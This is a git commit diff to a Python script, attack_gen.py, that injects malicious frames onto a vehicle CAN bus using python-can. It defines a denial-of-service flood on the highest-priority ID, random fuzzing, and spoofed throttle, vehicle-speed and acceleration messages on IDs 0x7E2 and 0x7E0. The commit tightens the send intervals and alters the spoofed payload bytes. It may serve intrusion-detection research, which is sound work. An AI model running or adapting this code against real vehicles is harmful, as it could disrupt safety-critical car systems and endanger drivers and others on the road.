b76e1dacfb0488fd762c40ec99ce229d3c7918ac
Fábio <fabiopapais0@gmail.com>
2024-05-28 09:54:36 -0300

    Minor time and config changes

--- attack_gen.py
+++ attack_gen.py
@@ -23,11 +23,11 @@ def generate_random_bytes():
         bytes.append(random.randrange(0, 255))
     return bytes
 
-def dos_attack(interval=0.003, duration=20):
+def dos_attack(interval=0.0002, duration=20):
     """Sends a strem of high-priority message."""
     print("Starting DoS Attack")
     for i in range(int(duration / interval)):
-        msg = can.Message(arbitration_id=0x000, data=[0, 0, 0, 0, 0, 0, 0, 0])
+        msg = can.Message(arbitration_id=0x000, data=[0, 0, 0, 0, 0, 0, 0, 0], is_extended_id=False)
         task = bus.send_periodic(msg, interval)
         assert isinstance(task, can.CyclicSendTaskABC)
         time.sleep(interval)
@@ -38,18 +38,18 @@ def fuzzy_attack(interval=0.003, duration=20):
     """Sends stream of random id and payload messages."""
     print("Starting Fuzzy Attack")
     for i in range(int(duration / interval)):
-        msg = can.Message(arbitration_id=random.randrange(0, 4095), data=generate_random_bytes())
+        msg = can.Message(arbitration_id=random.randrange(0, 4095), data=generate_random_bytes(), is_extended_id=False)
         task = bus.send_periodic(msg, interval)
         assert isinstance(task, can.CyclicSendTaskABC)
         time.sleep(interval)
         task.stop()
     print("Stopped Fuzzy attack")
 
-def throt_vehicspeed_spoofing(interval=0.1, duration=20):
+def throt_vehicspeed_spoofing(interval=0.001, duration=20):
     """Sends falsified throttle and vehicle speed message."""
     print("Starting Throttle and Vehicle Speed Spoofing")
     for i in range(int(duration / interval)):
-        msg = can.Message(arbitration_id=0x7E2, data=[00, 65, 00, 00, 00, 00, 00, 00])
+        msg = can.Message(arbitration_id=0x7E2, data=[00, 65, 13, 00, 00, 00, 00, 00], is_extended_id=False)
         task = bus.send_periodic(msg, interval)
         assert isinstance(task, can.CyclicSendTaskABC)
         time.sleep(interval)
@@ -60,7 +60,7 @@ def acelleration_spoofing(interval=0.05, duration=20):
     """Sends falsified acelleration response message."""
     print("Starting Acceleration Spoofing")
     for i in range(int(duration / interval)):
-        msg = can.Message(arbitration_id=0x7E0, data=[00, 65, 00, 00, 00, 00, 00, 00])
+        msg = can.Message(arbitration_id=0x7E0, data=[00, 65, 73, 00, 00, 00, 00, 00], is_extended_id=False)
         task = bus.send_periodic(msg, interval)
         assert isinstance(task, can.CyclicSendTaskABC)
         time.sleep(interval)
